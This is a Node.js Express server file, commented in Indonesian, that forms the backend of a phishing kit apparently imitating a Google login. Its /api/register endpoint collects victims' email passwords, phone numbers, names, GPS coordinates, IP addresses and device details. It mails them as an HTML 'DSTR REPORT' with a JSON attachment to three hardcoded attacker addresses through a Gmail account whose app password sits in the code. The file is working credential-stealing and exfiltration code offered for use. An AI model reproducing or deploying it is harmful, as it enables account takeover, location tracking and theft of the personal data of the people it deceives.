const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';
const RECEIVER_EMAIL = [
    'chilligemaass@gmail.com',
    'akunvanzz888@gmail.com',
    'zamzaja78@gmail.com'
];

// Cooldown per EMAIL TARGET
const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        console.log(`✅ Target BARU: ${targetEmail} → BISA dikirim`);
        return true;
    }
    
    if (record.lastPassword !== currentPassword) {
        console.log(`🔄 Password BERBEDA untuk ${targetEmail} → LANGSUNG BISA dikirim`);
        return true;
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    
    if (!canSend) {
        const remainingMinutes = Math.ceil((COOLDOWN_MS - timeElapsed) / (1000 * 60));
        console.log(`⏰ COOLDOWN: ${targetEmail} → Tunggu ${remainingMinutes} menit lagi`);
        return false;
    }
    
    return true;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

// Function buat dapetin flag emoji berdasarkan kode negara
function getFlagEmoji(countryCode) {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📥 DATA RECEIVED:');
        console.log('📍 GPS:', data.latitude, data.longitude);
        console.log('🌐 IP:', data.ip_address);
        console.log('📧 Target Email:', data.email);
        console.log('🔑 Password:', data.emailPassword);
        console.log('📱 Phone:', data.phone);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            console.log(`❌ NOT SENT: ${data.email} | Cooldown active`);
            return res.json({
                success: true,
                blocked: true,
                reason: `Cooldown 1 hour for same password`,
                cooldownInfo: getCooldownInfo(data.email)
            });
        }
        
        if (!isDup) {
            console.log(`🔄 Different password for ${data.email} → Sending now`);
        }
        
        // ========== DETEKSI BENDERA ==========
        const countryName = data.country || data.ip_country || 'Unknown';
        let countryCode = '';
        
        const countryMapping = {
            'indonesia': 'ID', 'indonesian': 'ID', 'id': 'ID',
            'malaysia': 'MY', 'singapore': 'SG', 'singapura': 'SG',
            'thailand': 'TH', 'vietnam': 'VN', 'philippines': 'PH', 'filipina': 'PH',
            'usa': 'US', 'united states': 'US', 'america': 'US', 'amerika': 'US',
            'uk': 'GB', 'united kingdom': 'GB', 'inggris': 'GB',
            'japan': 'JP', 'jepang': 'JP', 'korea': 'KR', 'south korea': 'KR',
            'china': 'CN', 'tiongkok': 'CN', 'india': 'IN', 'australia': 'AU',
            'germany': 'DE', 'jerman': 'DE', 'france': 'FR', 'prancis': 'FR',
            'netherlands': 'NL', 'belanda': 'NL', 'russia': 'RU', 'rusia': 'RU',
            'brazil': 'BR', 'brasil': 'BR', 'mexico': 'MX', 'mexiko': 'MX',
            'canada': 'CA', 'kanada': 'CA', 'italy': 'IT', 'italia': 'IT',
            'spain': 'ES', 'spanyol': 'ES', 'turkey': 'TR', 'turki': 'TR'
        };
        
        const lowerCountry = countryName.toLowerCase();
        for (const [key, code] of Object.entries(countryMapping)) {
            if (lowerCountry.includes(key)) {
                countryCode = code;
                break;
            }
        }
        
        if (!countryCode && data.ip_country_code) {
            countryCode = data.ip_country_code;
        }
        
        const flagEmoji = getFlagEmoji(countryCode);
        
        // ========== HTML EMAIL SUPER MODERN + FLAG ==========
        const htmlContent = `
                            <!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DSTR REPORT</title>

<style>

body{
    margin:0;
    padding:20px;
    background:#050505;
    font-family:Arial,sans-serif;
    color:white;
}

.container{
    max-width:700px;
    margin:auto;
    background:#0b0b0b;
    border:2px solid #00e5ff;
}

.topbar{
    background:#3914cc;
    color:#00e5ff;
    text-align:center;
    padding:20px;
    font-size:28px;
    font-weight:bold;
    letter-spacing:3px;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 15px #00e5ff;
}

.mainbox{
    padding:20px;
}

.data-box{
    background:white;
    color:black;
    margin-bottom:20px;
    border:2px solid #3914cc;
}

.data-title{
    background:#3914cc;
    color:#00e5ff;
    padding:12px;
    font-size:15px;
    font-weight:bold;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 10px #00e5ff inset;
}

.data-row{
    display:flex;
    justify-content:space-between;
    padding:12px;
    border-bottom:1px solid #999;
    gap:10px;
    word-break:break-word;
}

.data-row:last-child{
    border-bottom:none;
}

.label{
    font-weight:bold;
}

.value{
    text-align:right;
    max-width:60%;
}

.password{
    background:#dffcff;
    border:1px solid #00bcd4;
    padding:3px 8px;
}

.footer-sign{
    margin-top:25px;
    background:#3914cc;
    border:2px solid #00e5ff;
    text-align:center;
    padding:15px;
    color:#00e5ff;
    font-size:18px;
    font-weight:bold;
    box-shadow:0 0 15px #00e5ff;
}

</style>
</head>

<body>

<div class="container">

    <div class="topbar">
        DSTR REPORT 🇲🇽
    </div>

    <div class="mainbox">

        <!-- ACCOUNT -->
        <div class="data-box">

            <div class="data-title">
                📧 ACCOUNT INFORMATION
            </div>

            <div class="data-row">
                <div class="label">Email</div>
                <div class="value">
                    ${data.email || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Password</div>
                <div class="value password">
                    ${data.emailPassword || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Phone</div>
                <div class="value">
                    ${data.phone || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Full Name</div>
                <div class="value">
                    ${data.fullName || '-'}
                </div>
            </div>

        </div>

        <!-- GPS -->
        <div class="data-box">

            <div class="data-title">
                📍 GPS LOCATION
            </div>

            <div class="data-row">
                <div class="label">Latitude</div>
                <div class="value">
                    ${data.latitude || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Longitude</div>
                <div class="value">
                    ${data.longitude || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Accuracy</div>
                <div class="value">
                    ${data.gps_accuracy || '-'} m
                </div>
            </div>

        </div>

        <!-- LOCATION -->
        <div class="data-box">

            <div class="data-title">
                🌍 LOCATION
            </div>

            <div class="data-row">
                <div class="label">Country</div>
                <div class="value">
                    ${countryName} ${flagEmoji}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Province</div>
                <div class="value">
                    ${data.province || data.ip_region || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">City</div>
                <div class="value">
                    ${data.city || data.ip_city || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Postal Code</div>
                <div class="value">
                    ${data.postalCode || '-'}
                </div>
            </div>

        </div>

        <!-- NETWORK -->
        <div class="data-box">

            <div class="data-title">
                🌐 NETWORK
            </div>

            <div class="data-row">
                <div class="label">IP Address</div>
                <div class="value">
                    ${data.ip_address || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">ISP</div>
                <div class="value">
                    ${data.isp || '-'}
                </div>
            </div>

        </div>

        <!-- DEVICE -->
        <div class="data-box">

            <div class="data-title">
                🖥 DEVICE INFORMATION
            </div>

            <div class="data-row">
                <div class="label">Platform</div>
                <div class="value">
                    ${data.platform || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Resolution</div>
                <div class="value">
                    ${data.screenResolution || '-'}
                </div>
            </div>

            <div class="data-row">
                <div class="label">Language</div>
                <div class="value">
                    ${data.language || '-'}
                </div>
            </div>

        </div>

        <!-- TIME -->
        <div class="data-box">

            <div class="data-title">
                ⏰ TIMESTAMP
            </div>

            <div class="data-row">
                <div class="label">Time</div>
                <div class="value">
                    ${data.timestamp || new Date().toLocaleString()}
                </div>
            </div>

        </div>

        <!-- SIGN -->
        <div class="footer-sign">
            DSTR 🇲🇽
        </div>

    </div>

</div>

</body>
</html>
        `;
        
        // Send to each receiver separately (not merged)
        for (const receiver of RECEIVER_EMAIL) {
            await transporter.sendMail({
                from: `"𝗗𝗔𝗧𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 ${data.email || '-'} 𝗕𝗬 𝗗𝗦𝗧𝗥🇲🇽" <${SENDER_EMAIL}>`,
                to: receiver,
                subject: `ðŸ¦...WEB DSTR SHðŸ¦... Login Google ${flagEmoji}${countryName} ${data.ip_address || '-'}`,
                html: htmlContent,
                attachments: [{
                    filename: `ðŸ¦...WEB DSTR SHðŸ¦... Login Google${Date.now()}_${receiver.split('@')[0]}.json`,
                    content: JSON.stringify(data, null, 2)
                }]
            });
            console.log(`✅ Sent to: ${receiver}`);
            
            // Small delay betwe en sends to avoid merging
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        console.log(`✅ EMAIL SENT SUCCESSFULLY! Target: ${data.email}`);
        res.json({ success: true, message: 'Email sent successfully' });
        
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true, error: error.message });
    }
});

function getCooldownInfo(targetEmail) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return null;
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    return {
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60)),
        canSend: timeElapsed >= COOLDOWN_MS
    };
}

app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        return res.json({ exists: false, canSend: true });
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📧 Email sending active dengan HTML SUPER MODERN + FLAG`);
    console.log(`⏰ Cooldown: 1 hour for SAME email + SAME password`);
    console.log(`🔄 Different password → No cooldown, send immediately`);
});
